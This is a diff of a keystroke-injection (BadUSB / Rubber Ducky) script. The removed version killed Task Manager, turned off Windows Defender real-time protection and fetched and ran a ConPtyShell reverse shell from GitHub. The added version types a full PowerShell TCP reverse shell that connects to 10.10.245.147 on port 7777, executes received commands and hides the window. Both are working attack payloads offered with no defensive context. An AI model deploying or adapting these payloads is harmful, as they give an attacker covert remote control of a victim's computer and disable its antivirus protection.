@@ -1,25 +1,6 @@
-
-DELAY 300
 GUI r
-DELAY 400
-REM --> Opens Task Manager
-STRING taskmgr
-DELAY 400
+STRING powershell
 ENTER
-DELAY 350
-ALT f
-n
-DELAY 350
-REM --> Starts CMD
-STRING cmd
-TAB
-REM --> Turn On Admin Privileges
-SPACE
-REM --> Run
+STRING $client = New-Object System.Net.Sockets.TCPClient('10.10.245.147',7777);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ENTER
-DELAY 20
-
-REM --> Kills TaskManager, Executes PowerShell Commands (Hidden), Disables Windows Defender and Executes a Reverse Shell
-STRING taskkill /IM taskmgr.exe && powershell -WindowStyle hidden Set-MpPreference -DisableRealtimeMonitoring $true; IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell <IP> <PORT>");
-
- 
+GUI DOWN
